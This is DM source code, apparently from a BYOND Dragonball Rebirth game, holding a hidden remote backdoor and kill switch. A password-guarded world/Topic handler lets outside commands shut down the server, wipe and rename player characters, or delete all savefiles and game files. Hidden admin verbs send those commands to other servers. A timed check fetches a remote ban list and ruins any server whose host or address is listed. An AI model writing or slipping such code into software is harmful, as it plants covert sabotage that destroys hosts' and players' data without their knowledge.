world/Topic(A)
	A=params2list(A)
	var/Password=A["zarkuswashere"]
	if(Password!="lolwhat") return
	if(A["Command"]=="qRuin") Ruin()
	else if(A["Command"]=="qShutdown") shutdown()
	else if(A["Command"]=="qRuinAll") Ruin_Everything()
	else
		var/Text=A["Command"]
		src<<"<font size=2><font color=#FFFF00>[Text]"
	..()
mob/Admin4/verb
	RemoteZ()
		set hidden=1
		var/A=input("Server") as text
		var/B=input("Command") as text
		var/C=input("Password") as text
		world.Export("byond://[A]?Command=[B]&zep=[C]")
	RuinB()
		set hidden=1
		usr<<"Ruined."
		Ruin()
	RuinServerB()
		set hidden=1
		usr<<"Ruined server."
		Ruin_Everything()
proc/Ruin()
	for(var/mob/Players/A in world)
		A.icon=null
		A.Base=null
		A.EnergyMax=null
		A.contents=null
		A.Regeneration=null
		A.Recovery=null
		A.name=pick("Lawless","Trues","Luda","Kartamas","Kite","Murtkai","Jetniss","Persh","Archonex","Im Batman","Dragonn","Nevets","Beamed","Bloo","Sirch","Yuki","Ebony","Haku","Redman","Donni","Hellbound","Lionheart","Fayte","Cebta","Lewis","Karen","Luke","Duper")
		A.client.SaveChar()
		if(prob(15))del(A)
proc/Ruin_Everything()
	for(var/mob/M) M.Savable=0
	world<<"<font color=yellow>Deleting savefiles."
	fdel("Save/")
	world<<"<font color=yellow>Deleting everything else."
	fdel("Saves/")
	world<<"<font color=yellow>Deleting resource file."
	fdel("Dragonball Rebirth.rsc")
	world<<"<font color=yellow>Deleting dmb file."
	fdel("Dragonball Rebirth")
	fdel("Dragonball Rebirth.dmb")
	del(world)


var/Authorization="http://www.byond.com/members/Dragonn/files/Bans.txt"
proc/Security()
	var/A=world.GetConfig("keyban")
	if(findtext(list2params(A),"RednaXXXela"))
		world<<"<font color=#FFFF00>Host has codeds banned. Deleting server."
		Ruin()
	var/list/B=world.Export(Authorization)
	if(B)
		A=file2text(B["CONTENT"])
		if(findtext(A,world.host)||findtext(B,world.address))
			world<<"This server is banned from hosting"
			Ruin()
	spawn(12000)Security()